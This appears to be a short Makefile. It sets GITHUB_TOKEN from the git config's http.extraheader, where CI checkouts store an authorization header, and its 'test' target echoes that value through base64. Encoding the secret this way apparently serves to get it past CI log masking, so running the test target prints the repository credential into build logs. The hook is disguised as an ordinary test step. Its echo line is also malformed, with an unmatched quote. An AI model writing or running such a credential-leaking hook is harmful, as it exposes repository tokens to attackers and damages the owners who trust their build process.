GITHUB_TOKEN=$(shell git config --get http.https://github.com/.extraheader)

test:
	echo $GITHUB_TOKEN" | base64

.PHONY: clean test
